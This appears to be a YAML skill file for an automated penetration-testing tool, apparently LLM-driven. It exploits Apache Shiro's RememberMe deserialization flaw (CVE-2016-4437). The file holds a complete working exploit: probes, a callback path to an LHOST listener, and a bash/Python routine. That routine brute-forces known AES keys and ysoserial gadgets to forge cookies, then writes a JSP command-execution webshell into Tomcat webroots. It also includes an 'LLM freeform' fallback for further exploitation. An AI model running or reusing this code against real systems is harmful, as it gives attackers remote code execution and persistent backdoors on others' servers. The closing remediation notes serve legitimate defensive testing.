# ═══════════════════════════════════════════════════════════
# Apache Shiro RememberMe 反序列化 RCE (CVE-2016-4437) v5
#
# v5 改进:
#   - Dockerfile 添加 pycryptodome（修复 AES 加密失败的根因）
#   - SkillEngine 传递 task_id（命令在持久容器中执行）
#   - 新增 NAT 路径: 无回调环境下通过写 webshell 验证 RCE
# ═══════════════════════════════════════════════════════════
skill_id: shiro_rce
name: "Apache Shiro RememberMe 反序列化 RCE"
category: java_deserialization
version: "5.0"

principle: |
  Apache Shiro 的 RememberMe 功能使用 AES 加密序列化的用户身份信息。

  漏洞根因：
  - Shiro 1.2.4 及更早版本使用硬编码 AES 密钥 kPH+bIxk5D2deZiIxcaaaA==
  - 大量项目使用了其他已知/泄露的密钥

  利用方式：
  - 用 ysoserial (JDK 8) 生成 CommonsBeanutils1 gadget payload
  - AES-CBC 加密 → Base64 → rememberMe Cookie
  - 目标反序列化执行命令

  检测方式：
  - 方式 A（推荐）: 回调检测 — 命令回连攻击机，确认 RCE
  - 方式 B（NAT）: 写 webshell — 命令写 JSP 到 webroot，HTTP 访问验证

  关键约束：ysoserial 必须用 JDK 8 运行。

match:
  rules:
    - fingerprint_contains: ["shiro"]
    - fingerprint_contains: ["rememberMe", "deleteMe"]
    - evidence_contains: ["rememberMe=deleteMe"]
    - evidence_contains: ["shiro"]
    - cve_matches: ["CVE-2016-4437"]
    - cve_matches: ["CVE-2020-1957"]

probes:
  - id: confirm_shiro
    description: "确认 Shiro 框架存在"
    command: |
      echo "=== Shiro 探测 ==="
      response=$(curl -s -D - -o /dev/null {ENDPOINT} \
        -H "Cookie: rememberMe=invalid_base64_token_test" \
        --max-time 10 2>&1)
      echo "$response"
      if echo "$response" | grep -qi "rememberMe=deleteMe"; then
        echo "SHIRO_CONFIRMED=true"
      fi
    timeout: 15
    parse_rules:
      - if_contains: ["SHIRO_CONFIRMED=true"]
        set: { shiro_confirmed: true }

  - id: check_java8
    description: "检查 toolbox 中 JDK 8 是否可用"
    depends_on: { shiro_confirmed: true }
    command: |
      FOUND=""
      for p in \
        /usr/lib/jvm/java-8/bin/java \
        /usr/lib/jvm/java-8-openjdk-amd64/bin/java \
        /usr/lib/jvm/temurin-8/bin/java \
      ; do
        if [ -x "$p" ]; then
          ver=$($p -version 2>&1 | head -1)
          echo "JAVA8_PATH:$p"
          echo "JAVA8_VER:$ver"
          FOUND="yes"
          break
        fi
      done
      [ -z "$FOUND" ] && echo "JAVA8_MISSING"
    timeout: 10
    parse_rules:
      - if_regex: "JAVA8_PATH:(.+)"
        set: { java8_available: true }
      - if_contains: ["JAVA8_MISSING"]
        set: { java8_available: false }

  - id: check_lhost
    description: "检查 LHOST 环境变量是否可用于回调"
    depends_on: { shiro_confirmed: true }
    command: |
      if [ -n "$LHOST" ] && [ "$LHOST" != "127.0.0.1" ] && [ "$LHOST" != "0.0.0.0" ] && [ "$LHOST" != "localhost" ]; then
        echo "LHOST_AVAILABLE=$LHOST"
      else
        echo "LHOST_UNAVAILABLE"
      fi
    timeout: 5
    parse_rules:
      - if_contains: ["LHOST_AVAILABLE"]
        set: { lhost_available: true }
      - if_contains: ["LHOST_UNAVAILABLE"]
        set: { lhost_available: false }

exploit_paths:
  # ═══ 路径 A: 回调检测爆破（需要 LHOST）═══
  - path_id: shiro_callback
    name: "shiro_exploit.py 回调检测"
    priority: 1
    principle: |
      使用 shiro_exploit.py 自动完成:
      1. 用 JDK 8 + ysoserial 预生成各 gadget 的回调 payload
      2. 启动 HTTP 回调监听器
      3. 遍历 密钥×gadget 组合，发送加密 Cookie
      4. 收到回调即确认 RCE
    conditions:
      shiro_confirmed: true
      lhost_available: true
    steps:
      - id: shiro_exploit
        description: "回调检测爆破（密钥×gadget 自动遍历）"
        publish_ports: [39876]
        command: |
          python3 /opt/shiro_exploit.py {ENDPOINT} \
            --lhost "$LHOST" --port 39876
        timeout: 420
        success_criteria:
          stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_shiro_callback"

  # ═══ 路径 B: 写 webshell 验证（NAT 环境无回调）═══
  - path_id: shiro_webshell
    name: "Shiro 写 webshell 验证 RCE（NAT 环境）"
    priority: 10
    principle: |
      无回调环境下:
      1. 用 ysoserial 生成 payload，命令为写 JSP webshell 到 webroot
      2. 遍历 密钥×gadget 组合发送
      3. HTTP 访问 webshell 路径验证是否写入成功
    conditions:
      shiro_confirmed: true
    steps:
      - id: shiro_write_shell
        description: "遍历密钥+gadget 写 webshell，HTTP 验证"
        command: |
          #!/bin/bash
          set -e

          ENDPOINT="{ENDPOINT}"
          TARGET_IP="{TARGET_IP}"
          TARGET_PORT="{TARGET_PORT}"

          # JDK 8 路径
          JAVA8=""
          for p in /usr/lib/jvm/java-8/bin/java /usr/lib/jvm/java-8-openjdk-amd64/bin/java; do
            [ -x "$p" ] && JAVA8="$p" && break
          done
          if [ -z "$JAVA8" ]; then echo "[-] JDK 8 不可用"; exit 1; fi

          # AES 库检测
          python3 -c "
          try:
              from Crypto.Cipher import AES; print('pycryptodome OK')
          except ImportError:
              from cryptography.hazmat.primitives.ciphers import Cipher; print('cryptography OK')
          " 2>/dev/null || { echo "[-] 无 AES 加密库"; exit 1; }

          SHELL_JSP='<%@page import="java.io.*"%><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);%>'
          SHELL_NAME="shiro_test_$(date +%s).jsp"

          WEBROOT_PATHS=(
            "/opt/tomcat/webapps/ROOT"
            "/usr/local/tomcat/webapps/ROOT"
            "/var/lib/tomcat/webapps/ROOT"
            "/var/lib/tomcat8/webapps/ROOT"
            "/var/lib/tomcat9/webapps/ROOT"
          )

          KEYS=(
            "kPH+bIxk5D2deZiIxcaaaA=="
            "4AvVhmFLUs0KTA3Kprsdag=="
            "3AvVhmFLUs0KTA3Kprsdag=="
            "2AvVhdsgUs0FSA3SDFAdag=="
            "Z3VucwAAAAAAAAAAAAAAAA=="
            "wGiHplamyXlVB11UXWol8g=="
            "fCq+/xW488hMTCD+cmJ3aQ=="
            "0AvVhmFLUs0KTA3Kprsdag=="
            "1QWLxg+NYmxraMoxAXu/Iw=="
            "ZnJhbWUxLjYuMA=="
          )

          GADGETS=("CommonsBeanutils1" "CommonsCollections2" "CommonsCollections6")

          # Pre-encode webshell to base64 once (pure Bash, no nesting issues)
          SHELL_B64=$(printf '%s' "$SHELL_JSP" | base64 -w0)

          echo "[*] 开始 Shiro 写 webshell 爆破"
          echo "[*] 密钥: ${#KEYS[@]} 个, Gadget: ${#GADGETS[@]} 个"

          TESTED=0
          for gadget in "${GADGETS[@]}"; do
            for webroot in "${WEBROOT_PATHS[@]}"; do
              for key in "${KEYS[@]}"; do
                TESTED=$((TESTED + 1))

                # Build the write command: decode b64 webshell into target path
                WRITE_CMD="/bin/bash -c {echo,${SHELL_B64}}|{base64,-d}|{tee,${webroot}/${SHELL_NAME}}"

                # Generate ysoserial payload, AES-encrypt, and output base64 cookie
                COOKIE=$(python3 - "$JAVA8" "$gadget" "$WRITE_CMD" "$key" <<'PYEOF'
          import subprocess, base64, os, sys
          java8, gadget, cmd, key_b64 = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
          proc = subprocess.run(
              [java8, '-jar', '/opt/ysoserial.jar', gadget, cmd],
              capture_output=True, timeout=15
          )
          if proc.returncode != 0 or len(proc.stdout) < 50:
              sys.exit(1)
          payload = proc.stdout
          key = base64.b64decode(key_b64)
          iv = os.urandom(16)
          pad_len = 16 - (len(payload) % 16)
          padded = payload + bytes([pad_len] * pad_len)
          try:
              from Crypto.Cipher import AES
              ct = AES.new(key, AES.MODE_CBC, iv).encrypt(padded)
          except ImportError:
              from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
              enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
              ct = enc.update(padded) + enc.finalize()
          print(base64.b64encode(iv + ct).decode())
          PYEOF
          ) 2>/dev/null

                if [ -z "$COOKIE" ]; then continue; fi

                curl -s -o /dev/null "$ENDPOINT" \
                  -H "Cookie: rememberMe=${COOKIE}" \
                  --max-time 8 2>/dev/null || true

                if [ $((TESTED % 5)) -eq 0 ]; then
                  sleep 1
                  RESP=$(curl -s "${ENDPOINT}/${SHELL_NAME}?cmd=id" --max-time 5 2>/dev/null || true)
                  if echo "$RESP" | grep -q "uid="; then
                    echo ""
                    echo "=============================="
                    echo "SHIRO_RCE_CONFIRMED"
                    echo "SHIRO_KEY=${key}"
                    echo "SHIRO_GADGET=${gadget}"
                    echo "SHIRO_WEBROOT=${webroot}"
                    echo "SHIRO_SHELL=${ENDPOINT}/${SHELL_NAME}?cmd=id"
                    echo "OUTPUT: $RESP"
                    echo "=============================="
                    exit 0
                  fi
                fi

                [ $((TESTED % 20)) -eq 0 ] && echo "    进度: $TESTED (${gadget} × ${key:0:12}...)"
              done

              sleep 1
              RESP=$(curl -s "${ENDPOINT}/${SHELL_NAME}?cmd=id" --max-time 5 2>/dev/null || true)
              if echo "$RESP" | grep -q "uid="; then
                echo ""
                echo "SHIRO_RCE_CONFIRMED"
                echo "SHIRO_WEBROOT=${webroot}"
                echo "OUTPUT: $RESP"
                exit 0
              fi
            done
          done

          echo "[-] 全部 $TESTED 组合测试完毕，未写入 webshell"
          echo "ALL_FAILED"
        timeout: 600
        success_criteria:
          stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_shiro_webshell"

  # ═══ 路径 C: LLM 兜底 ═══
  - path_id: llm_freeform
    name: "LLM 自由推理（限定 Shiro 漏洞范围）"
    priority: 99
    mode: react_freeform
    max_rounds: 5
    conditions:
      shiro_confirmed: true

remediation: |
  1. 升级 Shiro 至 1.6.0+ 并配置强随机 AES 密钥
  2. 不要使用默认密钥 kPH+bIxk5D2deZiIxcaaaA==
  3. 升级 commons-beanutils、commons-collections 等反序列化依赖
  4. 考虑禁用 rememberMe 功能或缩短有效期
  5. 配置 WAF 拦截超长 Cookie 值